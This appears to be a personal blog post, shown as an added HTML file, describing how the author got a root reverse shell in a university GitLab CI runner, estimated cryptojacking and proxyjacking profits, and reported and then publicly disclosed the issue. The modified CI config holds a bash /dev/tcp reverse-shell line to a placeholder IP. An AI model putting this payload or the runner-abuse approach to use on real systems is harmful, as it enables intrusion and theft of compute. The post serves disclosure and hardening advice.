@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html><head lang="en"><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+	<meta charset="utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>Attacking CI workflows for fun and some unquantified profit - 0xpages</title><meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="description" content="CI workflows often give the user the possibility to execute commands inside containers in one war or another. However, with great power comes great responsability, and if the code execution is not properly isolated it could be used in malitious ways." />
+	<meta property="og:image" content=""/>
+	<meta property="og:url" content="http://localhost:1313/posts/cicdattack/">
+  <meta property="og:site_name" content="0xpages">
+  <meta property="og:title" content="Attacking CI workflows for fun and some unquantified profit">
+  <meta property="og:description" content="CI workflows often give the user the possibility to execute commands inside containers in one war or another. However, with great power comes great responsability, and if the code execution is not properly isolated it could be used in malitious ways.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-06-23T00:00:00+00:00">
+    <meta property="article:modified_time" content="2024-06-23T00:00:00+00:00">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Attacking CI workflows for fun and some unquantified profit">
+  <meta name="twitter:description" content="CI workflows often give the user the possibility to execute commands inside containers in one war or another. However, with great power comes great responsability, and if the code execution is not properly isolated it could be used in malitious ways.">
+<script src="http://localhost:1313/js/feather.min.js"></script>
+	
+	
+        <link href="http://localhost:1313/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css" rel="stylesheet">
+	
+
+	
+	<link rel="stylesheet" type="text/css" media="screen" href="http://localhost:1313/css/main.ac08a4c9714baa859217f92f051deb58df2938ec352b506df655005dcaf98cc0.css" />
+
+	
+	
+
+	
+	
+	
+	
+</head>
+<body>
+        <div class="content"><header>
+	<div class="main">
+		<a href="http://localhost:1313/">0xpages</a>
+	</div>
+	<nav>
+		
+		<a href="/">Home</a>
+		
+		<a href="/posts">All posts</a>
+		
+		<a href="/about">About</a>
+		
+		
+	</nav>
+</header>
+
+<main>
+	<article>
+		<div class="title">
+			<h1 class="title">Attacking CI workflows for fun and some unquantified profit</h1>
+			<div class="meta">Posted on Jun 23, 2024</div>
+		</div>
+		
+		<div class="tldr">
+			<strong>tl;dr:</strong>
+			I exploited a CI workflow and got RCE as `root` in the runner container. I could not manage to escape out of the container. However, I leveraged the root access and internet connection available to leak all secrets from the container and simulate what would be the profits if a malitious attacker would decide to establish a Cryptojacking and Proxyjacking campaign on this target. DISCLAIMER: THIS POST TALKS ABOUT A VERY TRIVIAL EXPLOIT. However, I focused on showing how even trivial exploits can have impact on the target.
+		</div>
+
+		<section class="body">
+			<p>This story began with me reading this great article [1], from John Stawinski.
+My mind imediately wandered to workflows that I use on daily basis and how could they be compromised.
+A workflow used frequently by me and thousands of other users is the <code>checker</code> workflow from our uni&rsquo;s assignment repository.</p>
+<h3 id="what-is-a-checker-workflow">What is a <code>checker</code> workflow?</h3>
+<p>For most of our coding assignments, we have checkers, that check if the submitted implementation meets the standard given in the assignment.
+When we start a new assigment, we can create a private fork of a public repo and do all our work there.
+The neat part? The code gets checked at every <code>push</code>, using a CI workflow and the student can see their grade*.
+The neat part <strong>for me</strong>? Our uni uses a self-hosted Gitlab instance, so chances to find misconfigurations are high. Even better, they use their own runner instances to execute the workflows.</p>
+<h3 id="looking-into-yamls-and-popping-shells">Looking into <code>yaml</code>s and popping shells</h3>
+<p>The file of interest for us is <code>.gitlab-ci.yml</code>. This files contains the configuration for the CI workflows of our repo.
+As we have a private fork of this repo, this file is in our full control.
+This is how the file looks like.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#f92672">image</span>: <span style="color:#ae81ff">docker:19.03.12</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">services</span>:
+</span></span><span style="display:flex;"><span>  - <span style="color:#ae81ff">docker:19.03.12-dind</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">stages</span>:
+</span></span><span style="display:flex;"><span>  - <span style="color:#ae81ff">build</span>
+</span></span><span style="display:flex;"><span>  - <span style="color:#ae81ff">test</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">variables</span>:
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">CONTAINER_RELEASE_IMAGE</span>: <span style="color:#ae81ff">$CI_REGISTRY_IMAGE:latest</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">DOCKER_HOST</span>: <span style="color:#ae81ff">tcp://docker:2375</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">DOCKER_TLS_CERTDIR</span>: <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">build</span>:
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">stage</span>: <span style="color:#ae81ff">build</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">before_script</span>:
+</span></span><span style="display:flex;"><span>    - <span style="color:#ae81ff">docker login -u $CI_REGISTRY_USER -p $CI_REGISTRY_PASSWORD $CI_REGISTRY</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">script</span>:
+</span></span><span style="display:flex;"><span>    - <span style="color:#ae81ff">docker build --pull -t $CONTAINER_RELEASE_IMAGE .</span>
+</span></span><span style="display:flex;"><span>    - <span style="color:#ae81ff">docker push $CONTAINER_RELEASE_IMAGE</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">only</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">variables</span>:
+</span></span><span style="display:flex;"><span>      - <span style="color:#ae81ff">$BUILD_DOCKER_IMAGE</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">checker</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">stage</span>: <span style="color:#ae81ff">test</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">image</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">name</span>: <span style="color:#ae81ff">&lt;REDACTED&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">script</span>:
+</span></span><span style="display:flex;"><span>        - <span style="color:#ae81ff">echo &#34;&#34;</span>
+</span></span></code></pre></div><p>Right from the start we see an injection point under <code>script</code>.
+I modified the CI to use as a script the most basic reverse shell one can find on <a href="https://revshell.com">https://revshell.com</a>.
+The end result looked something like this.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#f92672">checker</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">stage</span>: <span style="color:#ae81ff">test</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">image</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">name</span>: <span style="color:#ae81ff">&lt;REDACTED&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">script</span>:
+</span></span><span style="display:flex;"><span>        - <span style="color:#ae81ff">/bin/bash -i &gt;&amp; /dev/tcp/&lt;my_ip&gt;/5001 0&gt;&amp;1</span>
+</span></span></code></pre></div><p>I commited and pushed the change and then waited&hellip;
+Soon enough, the connection was established :)</p>
+<p><img src="/posts/imgs/rev_shell.png" alt="revserse shell screen capture"></p>
+<p>To my surprise, only 5 minutes from reading the article [1] I had a reverse shell.</p>
+<h3 id="container-escape-101-and-shenanigans">Container Escape 101 and Shenanigans</h3>
+<p>Ar first I tried to escape the obvious docker container I was running in.
+However, this rendered no results :(.
+I won&rsquo;t go into the details of what I tried here, as it was a basic container-escape attempt most readers probably are common with.</p>
+<p>Thinking of other thing I might be able to do I tried making the workflow use other containers, I knew existed. Again, hit the wall with this path.</p>
+<p>Using linpeas, I discovered a few interesting tidbits of information:</p>
+<ul>
+<li>Some metadata from: http://169.254.169.254/openstack/latest/meta_data.json. Nothing too special here, but at least I knew who to contact to report this. :)</li>
+<li>Some <code>graphql</code> endpoints, which told me the instance has its GraphQL API enabled. I tested the API too, and found some interesting things there as well. (PII disclosure for unauth users)</li>
+<li>A Github token, but very well configured privilege-wise.</li>
+</ul>
+<h3 id="got-impact-bro">Got Impact, Bro?</h3>
+<p>Sooo, is this everything we can find so far?
+At the end of the day, it is kind of the role of a CI to execute the students code, so nothing new under the sun that I got RCE.
+I could&rsquo;ve got the same RCE if my assignment code, written in C, created a reverse shell too.
+Of course, I found some things inspecting the GraphQL API, but this was out of the scope of this endeavour.</p>
+<p>Well, for the most observant of the readers, you might&rsquo;ve noticed I was <code>root</code> in my reverse shell.</p>
+<p><strong>root</strong>, <strong>reverse shell</strong></p>
+<p>Being root, and having a reverse shell mean two things:</p>
+<ol>
+<li>I can probably do whatever I want in that container; This means installing new programs and running them.</li>
+<li>I have internet access in that container.</li>
+</ol>
+<p>Soo, how do we prove impact? CRYPTOJACKING!</p>
+<p><img src="/posts/imgs/cryptojacking_meme.jpg" alt="cryptojacking_meme"></p>
+<p>Actually, not only cryptojacking. When having Remote Code Execution on a target which in itself has no monetary value, attackers often mix two attacks together to squeeze the most money out of the target.
+Cryptojacking is used to fully exploit the target&rsquo;s CPU capabalities, and Proxyjacking is used to use its bandwidth.
+If you want to read more about this I suggest peeking at this HackerNews article [2] from where I actually learned about Proxyjacking as well.</p>
+<p>For Cryptojacking, I decided to mine Monero, and simply searched how to mine Monero (as I&rsquo;ve never done this before).
+This first result was this one [3] and provided a simple and straight-forward solution to my problem.</p>
+<p>For Proxyjacking, on the other hand I had no idea how to do it; I only knew what it means at an abstract level.
+These two articles [4][5], helped me know what to search next.
+Sadly, most bandwidth-sharing providers required running their programs using Docker.
+The container I was in didn&rsquo;t allow running Docker in Docker (otherwise, I could&rsquo;ve also escape the container).
+Lucky for me, after some research, I found EarnApp [6] after to share the bandwidth from the target.</p>
+<p>I got a new fresh shell, and installed what was needed to start making that $$$.
+Wait a second&hellip; You didn&rsquo;t think I&rsquo;d actually do these things.
+I just wanted to prove their possible, and for the fun of it, estimate the profit a malitious actor could actually make.</p>
+<p>I installed EarnApp using the instructions provided here [7].
+For EarnApp, if the user opts for a fixed payout rate, they can make up to as much as $7/month [7] (as we are EU-based).
+Not much, but some nice pocket money one can make with ease.
+Also, they provide a variable payout rate as well, but there we have no way of estimating the profits without actually doing it.</p>
+<p><img src="/posts/imgs/earnapp_proof.png" alt="earnapp_installed_proof"></p>
+<p>For Monero mining, I installed <code>nanominer</code>. As nanominer is installed, we need a way to estimate the hashrate we can generate.
+A simple <code>lscpu</code> command shows the CPU we have in our control.</p>
+<p><img src="/posts/imgs/cpu_power_proof.png" alt="cpu_power_proof"></p>
+<p>I used xmrig.com [8] to check out if there are any existing benchmarks for Intel® Xeon® Silver 4316 CPU @ 2.30GHz.
+Lucky enough, there was a benchmark which showed that using 30 threads, one could get 13862.24 H/s.
+Further, I used the official Minero profits calculator [9] to estimate the profits.
+In the end we see that we will make a grand total of: $0.35 a day, or roughly $10 a month.</p>
+<p><img src="/posts/imgs/aint_much_meme.jpg" alt="aint_much_meme"></p>
+<p>While the profits aren&rsquo;t that big (this is the reason Cryptojacking and Proxyjacking are a numbers game after all), they would still provide an attacker with $204 a year, with (almost) zero effort.
+Also, this would use the resources of the target computer, disrupting the regular activity of the university.
+Not to mention, an attacker not interested in making money, could simply leverage this into a DOS attack.</p>
+<h3 id="lessons-learned">Lessons learned</h3>
+<p>What could&rsquo;ve been done better here?</p>
+<p>At the end of the day, the system was protected in some ways: no container escape, no improper authorizations, so the impact was way smaller then it could&rsquo;ve been.
+But, are there things that could have been done better?
+In my opinion, yes. There are zero reasons a workflow runner should run user-provided code as root, should have <code>apt</code> still installed, or should have access to the internet in this case.
+Were these rules enforced, there was zero impact to prove.</p>
+<h3 id="internal-and-public-disclosure">Internal and Public Disclosure</h3>
+<p>After discovering this, I contacted the responsible person (remember the leaked metadata from earlier?).
+The RCE was dismissed, as <code>&quot;it is normal for a student to have RCE, this is the way the CI should work&quot;</code>.
+After insisting on the suggestion that the container be secured, while allowing RCE, I got the answer that this would be <code>&quot;too much of a hassle&quot;</code>.</p>
+<p>The GraphQL findings were not mentioned even mentioned in the response, but were fixed later.
+The CI is still vulnerable to this day (more than 7 months since reporting the issue).</p>
+<p>I decided to disclose to the public an unfixed issue for two reasons:</p>
+<ol>
+<li>It makes for a nice story;</li>
+<li>The response I got from the university personel. If they say if my finding possesses no risk for their system, then there is zero reason not to make the finding public as well.</li>
+</ol>
+<p>* the grade can suffer modifications, the submissions also go through a plagiarism detector, etc. I tried to explain as straight-forward as possible the workflow&rsquo;s role.</p>
+<p>[1] <a href="https://johnstawinski.com/2024/01/05/worse-than-solarwinds-three-steps-to-hack-blockchains-github-and-ml-through-github-actions/">https://johnstawinski.com/2024/01/05/worse-than-solarwinds-three-steps-to-hack-blockchains-github-and-ml-through-github-actions/</a></p>
+<p>[2] <a href="https://thehackernews.com/2023/08/new-labrat-campaign-exploits-gitlab.html">https://thehackernews.com/2023/08/new-labrat-campaign-exploits-gitlab.html</a></p>
+<p>[3] <a href="https://www.monero.how/tutorial-how-to-mine-monero">https://www.monero.how/tutorial-how-to-mine-monero</a></p>
+<p>[4] <a href="https://www.akamai.com/blog/security-research/proxyjacking-new-campaign-cybercriminal-side-hustle">https://www.akamai.com/blog/security-research/proxyjacking-new-campaign-cybercriminal-side-hustle</a></p>
+<p>[5] <a href="https://sysdig.com/blog/proxyjacking-attackers-log4j-exploited/">https://sysdig.com/blog/proxyjacking-attackers-log4j-exploited/</a></p>
+<p>[6] <a href="https://help.earnapp.com/hc/en-us/articles/10261224561553-Installation-instructions-and-hardware-software-requirements">https://help.earnapp.com/hc/en-us/articles/10261224561553-Installation-instructions-and-hardware-software-requirements</a></p>
+<p>[7] <a href="https://help.earnapp.com/hc/en-us/articles/10144338291729-What-are-the-two-EarnApp-modes-and-rates-How-are-they-calculated">https://help.earnapp.com/hc/en-us/articles/10144338291729-What-are-the-two-EarnApp-modes-and-rates-How-are-they-calculated</a></p>
+<p>[8] <a href="https://xmrig.com/benchmark/5DqEG2">https://xmrig.com/benchmark/5DqEG2</a></p>
+<p>[9] <a href="https://www.coinwarz.com/mining/monero/calculator">https://www.coinwarz.com/mining/monero/calculator</a></p>
+
+		</section>
+
+		<div class="post-tags">
+			
+			
+			
+		</div>
+		</article>
+</main>
+<footer>
+  <div style="display:flex"><a class="soc" href="https://github.com/davidxbors" rel="me" title="GitHub"><i data-feather="github"></i></a>
+    <a class="border"></a><a class="soc" href="https://twitter.com/visitorish/" rel="me" title="Twitter"><i data-feather="twitter"></i></a>
+    <a class="border"></a></div>
+  <div class="footer-info">
+    2024  © davidxbors |  <a
+      href="https://github.com/athul/archie">Archie Theme</a> | Built with <a href="https://gohugo.io">Hugo</a>
+  </div>
+</footer>
+<script>
+  feather.replace()
+</script></div>
+    </body>
+</html>
